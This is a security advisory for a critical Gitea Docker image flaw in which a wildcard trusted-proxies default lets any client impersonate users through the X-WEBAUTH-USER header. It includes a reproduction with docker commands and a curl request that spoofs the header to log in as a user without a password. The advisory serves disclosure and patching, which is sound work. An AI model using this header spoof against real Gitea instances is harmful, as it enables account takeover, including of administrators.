# [C] Gitea Docker image: `REVERSE_PROXY_TRUSTED_PROXIES = *` default lets any source IP impersonate any user via `X-WEBAUTH-USER`

## Summary
Severity: Critical
Advisory: GHSA-f75j-4cw6-rmx4
CVE: CVE-2026-20896
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-f75j-4cw6-rmx4
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.3

## Details
# Summary

The Gitea Docker images ship an `app.ini` template that hard-codes:

```
REVERSE_PROXY_TRUSTED_PROXIES = *
```

The documented default for this setting, in `custom/conf/app.example.ini`, is `127.0.0.0/8,::1/128`, i.e. only loopback is trusted.

When an admin enables `ENABLE_REVERSE_PROXY_AUTHENTICATION = true` to put Gitea behind an authenticating reverse proxy and leaves the trusted-proxies setting at "the default", they expect only the proxy's loopback connection to inject identity. The Docker image instead trusts `X-WEBAUTH-USER` from **any source IP** that can reach the container.

## Affected

- `gitea/gitea` Docker images (verified `1.26.2`)
- `docker/root/etc/templates/app.ini:55`
- `docker/rootless/etc/templates/app.ini:52`

Binary distribution and self-built deployments that follow `app.example.ini` get the loopback-only default and are not affected.

## Reproduction

```
docker run -d --name g -p 3000:3000 \
  -e GITEA__service__ENABLE_REVERSE_PROXY_AUTHENTICATION=true \
  -e GITEA__security__INSTALL_LOCK=true \
  gitea/gitea:1.26.2

sleep 15
docker exec --user git g gitea admin user create \
  --username alice --password "longpasswordhere1234" \
  --email alice@x.test --must-change-password=false

Now the attack::


curl -s -L -H "X-WEBAUTH-USER: alice" http://localhost:3000/ \
  | grep -oE '<title>[^<]+</title>'
```

Output: `<title>alice - Dashboard - Gitea: Git with a cup of tea</title>` — attacker is logged in as alice with one header, no password, no cookie.

Same payload with `X-WEBAUTH-USER: <any_existing_username>` impersonates that user.

## Impact

Any process that can reach the Gitea container's HTTP port directly — not through the intended authenticating proxy — can impersonate any user whose login name is known or guessable. Admin accounts (`admin`, `gitea_admin`, etc.) are the obvious targets.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4
- https://nvd.nist.gov/vuln/detail/CVE-2026-20896
- https://github.com/go-gitea/gitea/pull/38151
- https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.3
